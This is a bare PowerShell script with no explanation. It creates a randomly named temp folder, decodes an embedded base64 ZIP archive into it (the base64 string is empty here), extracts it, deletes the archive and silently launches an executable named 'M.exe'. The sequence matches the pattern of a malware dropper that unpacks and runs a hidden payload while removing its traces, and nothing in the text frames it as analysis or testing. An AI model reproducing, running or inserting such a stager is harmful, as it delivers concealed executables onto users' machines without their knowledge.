$d = Join-Path $env:temp 'M_105HDGDL69';
New-Item -ItemType Directory -Path $d -Force | Out-Null;
$z = Join-Path $d 'z.zip';
[io.file]::WriteAllBytes($z, [Convert]::FromBase64String(''));
Expand-Archive $z $d -Force;
Remove-Item $z -Force;
cd $d;
Start-Process '.\M.exe';
exit;
